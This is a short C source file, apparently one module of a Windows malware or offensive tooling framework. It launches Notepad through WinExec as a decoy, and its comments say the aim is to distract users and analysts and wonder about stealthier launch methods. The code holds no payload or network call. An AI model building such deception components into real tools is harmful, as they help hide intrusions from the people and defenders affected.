/* MODULE: DECOY
 * TYPE: winexec
 * DESC: Launches a benign process (notepad) to distract users/analysts.
 */
#include "../header/definitions.h"

FORCE_INLINE void decoy() {
    // use CreateProcess for stealth or stealthier launch methods?
    WinExec("C:\\windows\\system32\\notepad.exe", SW_SHOW);
}
